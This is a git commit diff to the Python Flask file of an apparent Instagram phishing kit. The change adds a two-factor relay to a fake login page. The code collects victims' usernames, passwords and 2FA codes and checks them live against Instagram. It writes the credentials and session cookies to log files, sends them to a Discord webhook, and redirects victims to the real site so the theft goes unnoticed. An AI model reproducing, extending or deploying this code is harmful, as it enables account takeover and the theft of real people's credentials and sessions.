85d1ec0afb8b3bfc13d20f90ac44fef2f4d689f8
perviz_muslumov <157914250+perviz19@users.noreply.github.com>
2024-06-24 02:05:29 +0400

    Update web_app.py

--- web_app.py
+++ web_app.py
@@ -4,10 +4,10 @@ import pytz
 import logging
 import json
 import requests
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect
 from dotenv import load_dotenv
-from app.instagram_api import IsExists
-from app.functions import set_agent, edit_cookies, first_art, correct_answer, wrong_answer
+from app.instagram_api import IsExists,two_factor
+from app.functions import  edit_cookies, first_art, correct_all, wrong_answer, twoFA_active,twoFA_correct
 from colorama import Fore, Style
 import concurrent.futures
 
@@ -15,6 +15,12 @@ app = Flask(__name__)
 load_dotenv()
 
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
+username = None
+password = None
+user_agent = None
+two_factor_identifier = None
+
+
 
 def send_webhook_message(webhook_url, message):
     data = {
@@ -30,8 +36,11 @@ def send_webhook_message(webhook_url, message):
     except requests.exceptions.RequestException as e:
         print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")
 
+
+
 @app.route('/')
 def index():
+    global user_agent
     time_zone = "Asia/Baku"  # You can change it
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
@@ -48,40 +57,73 @@ def index():
     
     return render_template('index.html')
 
-@app.route('/submit', methods=['POST'])
+
+
+
+@app.route('/submit', methods=['POST','GET'])
 def submit():
+    global username, password, user_agent, two_factor_identifier
     username = request.form['username']
     password = request.form['password']
-    user_agent = set_agent()
-    
     result, cookies = IsExists(username, password, user_agent)
 
     if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
         cookies = edit_cookies(cookies)
-        correct_answer(username, password, cookies)
-        
+        correct_all(username, password, cookies)
         with open('output/pass_user.log', 'a') as f:
             f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")
-        
         message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
-        
-        # Using ThreadPoolExecutor to send the message asynchronously
         with concurrent.futures.ThreadPoolExecutor() as executor:
             future = executor.submit(send_webhook_message, DISCORD_WEBHOOK_URL, message)
-            # Optionally, you can wait for the result if needed
             result = future.result()
+        return redirect("https://www.instagram.com")
 
-        return redirect("http://www.instagram.com")
+    elif result.get("two_factor_required"):
+        print("TWO factor acik. ")
+        two_factor_identifier = result.get("two_factor_info", {}).get("two_factor_identifier")
+        with open('output/pass_user.log', 'a') as f:
+            f.write(f"\nUsername: {username}\nPassword: {password}")
+        twoFA_active(username,password)
+        return redirect("/twoFA")
+   
     else:
         wrong_answer(username, password)
         with open('output/wrong_pass.log', 'a') as f:
             f.write(f"\nUsername: {username}\nPassword: {password}\n")
-        return render_template('error.html')
+        return render_template('/error.html')
+
+
+
+
+@app.route('/twoFA', methods=['GET', 'POST'])
+def twoFA():
+    global username, password, user_agent, two_factor_identifier
+
+    if request.method == 'POST':
+        code = request.form['code']
+        result,cookies = two_factor(code,two_factor_identifier,username,user_agent)
+        
+        if result.get("authenticated") is not None and result.get("authenticated"):
+            message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
+            cookies = edit_cookies(cookies)
+            twoFA_correct(cookies)
+            with open('output/pass_user.log', 'a') as f:
+                f.write(f"{cookies}\n")
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                executor.submit(send_webhook_message, DISCORD_WEBHOOK_URL, message)
+        else:
+            return render_template('/twoFA_error.html')
+    
+    else:
+        return render_template('twoFA.html')
+
+    return redirect("https://www.instagram.com")
+
 
 if __name__ == '__main__':
     try:
         log = logging.getLogger('werkzeug')
-        log.disabled = True
+        log.disabled = False
         logging.disable(logging.CRITICAL)
         host = '0.0.0.0'
         port = 8080
